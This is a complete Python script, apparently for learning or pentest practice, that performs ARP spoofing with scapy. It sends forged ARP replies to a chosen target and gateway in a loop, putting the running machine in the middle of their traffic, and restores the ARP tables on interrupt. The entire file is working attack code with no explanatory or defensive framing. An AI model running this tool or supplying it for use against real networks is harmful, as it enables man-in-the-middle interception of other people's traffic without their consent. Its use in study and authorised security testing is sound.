#ARP spoofer
#! /usr/bin/python

import scapy.all as scapy
import optparse
import time
import logging

def get_argument():
    parser=optparse.OptionParser()
    parser.add_option("-g", "--gateway", dest="ip_gat", help="Provide the IP wanted to spoof")
    parser.add_option("-t","--target",dest="ip_tar",help="Provide the IP as spoof")
    (options, arugments) = parser.parse_args()
    if not (options.ip_gat and options.ip_tar):
        parser.error("Please enter IP to search. Use --help for more information")
    return options

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    scapy.send(packet, verbose=False)

def recover(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_argument()
sent_packet_count = 0
try:
    while True:
        spoof(options.ip_tar,options.ip_gat)
        spoof(options.ip_gat,options.ip_tar)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet Sent: " + str(sent_packet_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    recover(options.ip_tar,options.ip_gat)
    recover(options.ip_gat,options.ip_tar)
    print("\n[+] Stopped spoofing and reverting the changes.... Please wait")
